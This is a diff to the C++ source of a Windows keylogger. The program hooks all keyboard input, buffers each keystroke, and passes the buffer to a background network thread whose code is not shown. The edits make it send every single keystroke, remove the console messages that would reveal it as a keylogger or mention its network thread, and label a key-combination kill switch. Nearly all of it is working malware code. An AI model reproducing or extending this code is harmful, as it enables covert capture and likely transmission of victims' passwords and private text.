@@ -17,7 +17,7 @@
 #include<string>
 #include<atomic>
 #include "networkControl.h"
-#define DEF_ACC_BUFFER_SIZE 10
+#define DEF_ACC_BUFFER_SIZE 1
 
 
 using namespace std;
@@ -38,9 +38,9 @@ mutex m;                    // mutex and condition variable for thread synchroni
 condition_variable cv;
 atomic<bool> quit(false);
 
-void cleanUp()
+void cleanUp()              // page up+ backspace + right alt/altGr
 {
-    //networkControl::cleanUp();
+    quit = true;
     UnhookWindowsHookEx(keyboardHook);
     exit(0);
 }
@@ -95,7 +95,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         case VK_RMENU:
             wcout<<"[RALT DOWN]"<<endl;
             keyState[VK_RMENU] = 0x80;
-            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();}
+            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();}     // kill switch
             break;
         case VK_CAPITAL:
             wcout<<"[CAPS]"<<endl;
@@ -105,11 +105,11 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         case VK_BACK:
             keyState[VK_BACK] = 0x80;
             wcout<<"[BACKSPACE]"<<endl;
-            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){ cleanUp();}
+            if ((keyState[VK_TAB] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){ cleanUp();}    // kill switch
             break;
         case VK_PRIOR:         
             keyState[VK_PRIOR] = 0x80;
-            if ((keyState[VK_PRIOR] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();} 
+            if ((keyState[VK_PRIOR] & 0x80) && (keyState[VK_BACK] & 0x80) && (keyState[VK_RMENU] & 0x80)){cleanUp();}   // kill switch
             break;
         case VK_RETURN:
             accBuffer = accBuffer + L'\n';
@@ -126,7 +126,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
             accBuffer = accBuffer + uniChar;
             
-            if(accBuffer.length() == DEF_ACC_BUFFER_SIZE){
+            if(accBuffer.length() >= DEF_ACC_BUFFER_SIZE){
                 wcout << accBuffer<<endl;
                 
                 
@@ -158,14 +158,13 @@ int main()
     _setmode(_fileno(stdout), _O_U16TEXT);                                  //modification for printing UTF-16 chars to console
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     MSG msg;
-    wcout<<L"Starting network control thread..."<<endl;
     thread networkThread(networkControl::networkControlThread, &m, &cv, &dataReady, &accBuffer, &quit); //start network thread
     networkThread.detach();                             //detach the thread so it runs in the background
 
     //main message loop, does not occupy 100% CPU :D
     while(GetMessage(&msg, NULL, 0, 0))
     {   
-        wcout<<"Keylogger"<<endl;
+
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
